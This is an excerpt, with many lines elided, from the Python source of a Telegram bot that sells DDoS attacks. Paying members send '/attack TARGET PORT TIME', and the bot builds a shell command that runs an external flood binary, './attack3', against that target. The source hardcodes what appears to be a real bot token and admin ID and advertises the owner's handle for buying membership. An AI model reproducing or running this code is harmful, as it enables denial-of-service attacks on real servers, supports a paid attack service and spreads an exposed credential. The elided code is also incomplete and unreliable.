...
bot = telebot.TeleBot('7027104584:AAHqyALIMwhRKY8TWWnBFgN2sLf70Q_tW30')
admin_id = ["6804992562"]
...
def remove_user(message):
    ...
    if user_id in admin_id:
        ...
        response = "𝗪𝗘 𝗔𝗥𝗘 𝗦𝗢𝗥𝗥𝗬 𝗬𝗢𝗨 𝗔𝗥𝗘 𝗡𝗢𝗧 𝗢𝗪𝗡𝗘𝗥 𝗢𝗙 𝗧𝗛𝗜𝗦 𝗕𝗢𝗧 . 𝗢𝗪𝗡𝗘𝗥 𝗜𝗦 - @RUPAMxOWNER"
...
def handle_bgmi(message):
    ...
    if user_id in allowed_user_ids:
        ...
        if user_id not in admin_id:
            ...
            print(f"Cooldown updated for user {user_id} at {current_time}.")  # Debug message
        ...
        if len(command) == 4:
            ...
            if time > 300:
                ...
                full_command = f"./attack3 {target} {port} {time} 200"
                try:
                    ...
                    response = "🚨 𝗘𝗥𝗥𝗢𝗥: 𝗙𝗔𝗜𝗟𝗘𝗗 𝗧𝗢 𝗘𝗫𝗘𝗖𝗨𝗧𝗘 𝗖𝗢𝗠𝗠𝗔𝗡𝗗."

        else:
            response = ("𝗘𝗡𝗧𝗘𝗥 𝗧𝗛𝗘 𝗔𝗧𝗧𝗔𝗖𝗸\n"
                        "𝗟𝗜𝗞𝗘 :- /attack 𝟮𝟬.𝟮𝟯𝟱.𝟭𝟳𝟮 𝟭𝟴𝟲𝟭𝟳 𝟮𝟰𝟬\n"
                        "𝗟𝗜𝗞𝗘 :- /attack 𝗧𝗔𝗥𝗚𝗘𝗧 𝗣𝗢𝗥𝗧 𝗧𝗜𝗠𝗘\n\n")
    else:
        response = "🚫 𝗬𝗢𝗨 𝗛𝗔𝗩𝗘𝗡'𝗧 𝗣𝗨𝗥𝗖𝗛𝗔𝗦𝗘𝗗 𝗠𝗘𝗠𝗕𝗘𝗥𝗦𝗛𝗜𝗣 𝗢𝗙 𝗕𝗢𝗧. 𝗧𝗢 𝗕𝗨𝗬 𝗗𝗠 - @RUPAMxOWNER"
...
def welcome_start(message):
    ...
    response = f'''𝗪𝗘𝗟𝗖𝗢𝗠𝗘 {𝐮𝐬𝐞𝐫_𝐧𝐚𝐦𝐞} 𝗧𝗢 𝗠𝗬 𝗔𝗜𝗭𝗘𝗡 𝗗𝗗𝗢𝗦 ☠️ 𝗕𝗢𝗧 :-\n𝗙𝗢𝗥 𝗠𝗢𝗥𝗘 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦 𝗧𝗥𝗬 𝗧𝗢 𝗥𝗨𝗡 𝗧𝗛𝗜𝗦 𝗖𝗢𝗠𝗠𝗔𝗡𝗗 : /attack3\n'''
    bot.reply_to(message, response)
    
@bot.message_handler(commands=['owner'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f'''@RUPAMxOWNER'''
    bot.reply_to(message, response)
